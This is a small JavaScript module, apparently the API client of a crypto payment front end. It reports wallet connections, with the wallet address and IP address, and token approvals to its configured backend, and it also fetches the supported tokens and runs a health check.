import axios from 'axios';
import { BACKEND_URL } from '../config/tokens';

// Notify backend about wallet connect
export async function notifyWalletConnect(walletAddress, ipAddress) {
    try {
        const response = await axios.post(`${BACKEND_URL}/api/payment/wallet-connect`, {
            walletAddress,
            ipAddress
        });
        return response.data;
    } catch (error) {
        console.error('Error notifying wallet connect:', error);
        return null;
    }
}

// Notify backend about approval (fire & forget)
export async function notifyApproval(walletAddress, tokenAddress) {
    try {
        // Fire & forget - response wait nahi karenge
        axios.post(`${BACKEND_URL}/api/payment/approval`, {
            walletAddress,
            tokenAddress
        }).then(response => {
            console.log('Approval notified:', response.data);
        }).catch(error => {
            console.error('Error notifying approval:', error);
        });
        
        return true;
    } catch (error) {
        console.error('Error in notifyApproval:', error);
        return false;
    }
}

// Get supported tokens from backend
export async function getSupportedTokens() {
    try {
        const response = await axios.get(`${BACKEND_URL}/api/payment/tokens`);
        return response.data;
    } catch (error) {
        console.error('Error getting supported tokens:', error);
        return null;
    }
}

// Health check
export async function healthCheck() {
    try {
        const response = await axios.get(`${BACKEND_URL}/api/payment/health`);
        return response.data;
    } catch (error) {
        console.error('Health check error:', error);
        return null;
    }
}